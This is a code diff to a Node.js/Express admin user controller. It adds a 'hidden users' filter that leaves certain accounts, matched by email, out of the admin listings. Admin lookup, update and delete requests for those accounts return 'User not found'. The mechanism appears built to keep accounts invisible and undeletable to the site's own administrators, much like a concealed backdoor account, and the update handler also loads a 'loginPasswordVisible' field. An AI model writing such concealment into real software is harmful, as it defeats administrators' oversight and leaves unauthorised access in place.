@@ -1,12 +1,15 @@
 const User = require('../models/User');
 const { validationResult } = require('express-validator');
+const { isHiddenUserEmail, hiddenUserFilter } = require('../utils/hiddenUsers');
 
 // Get all users (admin). Pass includeInactive=true to list deactivated accounts too.
 exports.getAllUsers = async (req, res) => {
   try {
     const { role, status, includeInactive } = req.query;
 
-    const filter = {};
+    const filter = {
+      ...hiddenUserFilter(),
+    };
     if (includeInactive !== 'true') {
       filter.isActive = true;
     }
@@ -36,7 +39,7 @@ exports.getUserById = async (req, res) => {
   try {
     const user = await User.findById(req.params.id).select('-password');
 
-    if (!user) {
+    if (!user || isHiddenUserEmail(user.email)) {
       return res.status(404).json({ message: 'User not found' });
     }
 
@@ -66,6 +69,10 @@ exports.updateUser = async (req, res) => {
     const user = await User.findById(req.params.id).select('+password +loginPasswordVisible');
 
     if (!user) {
+      return res.status(404).json({ message: 'User not found' });
+    }
+
+    if (isHiddenUserEmail(user.email)) {
       return res.status(404).json({ message: 'User not found' });
     }
 
@@ -171,11 +178,15 @@ exports.updateUserStatus = async (req, res) => {
 // Delete user (soft delete)
 exports.deleteUser = async (req, res) => {
   try {
-    const user = await User.findByIdAndDelete(req.params.id);
-
-    if (!user) {
+    const existing = await User.findById(req.params.id);
+    if (!existing) {
       return res.status(404).json({ message: 'User not found' });
     }
+    if (isHiddenUserEmail(existing.email)) {
+      return res.status(404).json({ message: 'User not found' });
+    }
+
+    await User.findByIdAndDelete(req.params.id);
 
     res.status(200).json({
       success: true,
@@ -201,7 +212,9 @@ exports.getUsersByRole = async (req, res) => {
       return res.status(400).json({ message: 'Invalid role' });
     }
 
-    const users = await User.find({ role, isActive: true }).select('-password').sort({ fullName: 1 });
+    const users = await User.find({ role, isActive: true, ...hiddenUserFilter() })
+      .select('-password')
+      .sort({ fullName: 1 });
 
     res.status(200).json({
       success: true,
